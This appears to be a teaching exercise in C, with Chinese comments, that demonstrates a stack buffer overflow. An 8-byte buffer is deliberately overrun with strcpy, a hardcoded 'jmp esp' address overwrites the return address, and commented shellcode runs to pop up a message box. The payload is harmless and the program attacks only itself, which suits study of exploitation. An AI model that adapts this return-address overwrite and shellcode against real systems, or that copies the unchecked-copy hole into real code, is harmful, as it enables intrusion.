#include <windows.h>
#include <stdio.h>

CHAR src[]=
	"\x41\x41\x41\x41"
	"\x41\x41\x41\x41"
	//以上8个字节是为了填充满dest
	"\x41\x41\x41\x41"
	//以上四个字节填充保存旧堆栈栈底的栈帧;
	//"\x12\x45\xFA\x7F"
	"\x7B\x46\x86\x7C" //也可以
	//以上四个字节是源程序中某句jmp esp的地址，覆盖返回地址
	"\x66\x81\xEC\x04\x04"					//sub sp,0404h	其实这句并没必要
	"\x33\xFF"								//xor edi,edi
	"\x57"									//push edi
	"\xC6\x04\x24\x6D"						//mov byte ptr [esp],6Dh
	"\xC6\x44\x24\x01\x6D"					//mov byte ptr [esp+1],6Dh
	"\xC6\x44\x24\x02\x6D"					//mov byte ptr [esp+2],6Dh
	"\x57"									//push edi
	"\x8D\x44\x24\x04"						//lea eax,[esp+4]
	"\x50"									//push eax
	"\x50"									//push eax
	"\x57"									//push edi
	"\xB8\xEA\x07\xD5\x77"					//mov eax,77D507EAh
	"\xFF\xD0";								//call eax				

int main()
{
	LoadLibraryA("user32.dll");
	CHAR dest[8]={0};
	strcpy(dest,src);
	return 0;
}